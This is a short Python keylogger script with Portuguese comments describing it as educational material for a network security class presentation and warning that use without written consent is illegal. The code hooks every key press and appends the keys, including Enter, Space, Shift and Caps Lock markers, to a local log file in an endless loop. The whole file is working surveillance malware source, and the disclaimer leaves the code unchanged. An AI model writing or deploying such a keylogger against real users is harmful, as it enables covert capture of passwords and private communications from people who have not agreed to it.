#Este arquivo foi feito para fins educacionais, para uma apresentação na materia RCS(REDES DE COMPUTADORES E SEGURANÇA DA INFORMAÇÃO).
#Os keyloggers são ferramentas poderosas que podem ser usadas para monitorar o que é digitado em um computador. 
#No entanto, seu uso sem o consentimento explícito da pessoa que está sendo monitorada é ilegal e antiético. 
#A instalação de um keylogger em um computador sem o conhecimento e consentimento da pessoa pode resultar em violações de privacidade e em potenciais implicações legais. 
#Antes de usar um keylogger, certifique-se de obter a permissão por escrito da pessoa que será monitorada. 
#Além disso, os dados coletados pelo keylogger devem ser armazenados com segurança e protegidos contra acesso não autorizado. 
#Se você não tem a autorização ou os conhecimentos necessários para usar um keylogger de forma ética e legal, não utilize essa ferramenta. 
#Use o keylogger por sua própria conta e risco.



import keyboard
import time

filename = "Bloco_security.txt"

shift_delay = 0.5

shift_pressed_recently = False

def on_key_press(event):
    global shift_pressed_recently

    with open(filename, "a") as file:
        if event.name == "enter":
            file.write("\n")
        elif event.name == "caps lock":
            file.write("//")
        elif event.name == "space":
            file.write(" ")
        elif event.name == "shift":
            if not shift_pressed_recently:
                file.write("Shift")
                shift_pressed_recently = True
                time.sleep(shift_delay)
        else:
            file.write(event.name)
            shift_pressed_recently = False

keyboard.on_press(on_key_press)

while True:
    pass